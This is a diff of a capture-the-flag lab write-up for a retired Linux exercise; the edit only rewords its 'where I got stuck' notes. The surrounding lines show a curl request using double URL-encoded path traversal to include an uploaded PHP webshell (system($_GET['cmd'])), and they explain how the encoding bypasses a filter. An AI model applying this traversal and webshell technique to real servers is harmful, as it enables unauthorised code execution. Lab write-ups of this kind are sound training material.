@@ -8,7 +8,7 @@ difficulty: Academy
 os: Linux
 status: Retired
 
-stuck_summary: "Spent ages trying to get a reverse shell before realising the container was network isolated — just read the flag directly via the webshell"
+stuck_summary: "Spent ages trying to get a reverse shell when I didnt need it instead I could just read the flag directly via the webshell"
 
 tags:
   - linux
@@ -60,7 +60,7 @@ curl "http://ATTACK_IP/contact.php?region=%252E%252E%252Fuploads%252FMD5HASH&cmd
 
 ## Where I Got Stuck
 
-- **Chased a reverse shell that could never work** — spent a long time trying to get a reverse shell before realising the container is network isolated. There's no outbound connectivity. Just read the flag directly via the webshell `cmd` parameter.
+- **Chased a reverse shell that could never work** — spent a long time trying to get a reverse shell which was uneeded to finish the task. Just read the flag directly via the webshell `cmd` parameter.
 - **Silent syntax error in shell.php** — shell wasn't executing at all. Turned out to be a missing `)` in `system($_GET["cmd"]`. The upload succeeded but the PHP was broken. Always verify your webshell syntax before uploading.
 - **Single URL encoding still blocked** — `%2E%2E%2F` gets decoded once by the server before the filter runs, so it still sees `../` and blocks it. Double encoding (`%252E%252E%252F`) bypasses this because the filter sees encoded characters, not the traversal pattern.
 - **Wrong LFI wordlist approach** — wasted time fuzzing LFI paths on `region=` with a wordlist. Every response came back the same size. The LFI only works when pointing at the uploaded shell — it's not a general path traversal.
